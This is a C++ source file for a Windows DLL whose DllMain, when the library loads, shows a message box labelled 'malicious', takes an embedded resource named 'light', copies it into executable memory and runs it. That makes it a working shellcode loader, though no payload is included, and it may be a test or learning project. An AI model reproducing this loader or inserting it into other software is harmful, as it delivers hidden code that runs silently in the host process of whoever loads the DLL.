// dllmain.cpp : Defines the entry point for the DLL application.
#include <windows.h>
#include "stdafx.h"
#include "resource.h"
#include <strsafe.h>
#include <iostream>
using namespace std;

extern "C" __declspec(dllexport) void Entry(HMODULE hndl) {

}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH: {
		MessageBox(NULL,L"begins",L"malicious",MB_OK);

		struct Parameters {
			std::size_t size_bytes = 0;
			void* ptr = NULL;
		};

		HRSRC hResource = NULL;
		HGLOBAL hMemory = NULL;

		Parameters p;

		hResource = FindResource(hModule, MAKEINTRESOURCE(IDR_LIGHT1), L"light");
		hMemory = LoadResource(hModule, hResource);

		if (hMemory != NULL) {

			p.size_bytes = SizeofResource(hModule, hResource);
			p.ptr = LockResource(hMemory);
			if (p.ptr != NULL) {

				void * exec = VirtualAlloc(0, p.size_bytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				memcpy(exec, p.ptr, p.size_bytes);
				((void(*)())exec)();
			}
		}
		else {
			LPVOID lpMsgBuf;
			LPVOID lpDisplayBuf;
			DWORD dw = GetLastError();

			FormatMessage(
				FORMAT_MESSAGE_ALLOCATE_BUFFER |
				FORMAT_MESSAGE_FROM_SYSTEM |
				FORMAT_MESSAGE_IGNORE_INSERTS,
				NULL,
				dw,
				MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
				(LPTSTR)&lpMsgBuf,
				0, NULL);

			// Display the error message and exit the process

			lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
				(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)"FindResource") + 40) * sizeof(TCHAR));
			StringCchPrintf((LPTSTR)lpDisplayBuf,
				LocalSize(lpDisplayBuf) / sizeof(TCHAR),
				TEXT("%s failed with error %d: %s"),
				L"FindResource", dw, lpMsgBuf);
			MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

			LocalFree(lpMsgBuf);
			LocalFree(lpDisplayBuf);
		}

		//MessageBox(NULL, L"Ends", L"malicious", MB_OK);
		break;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

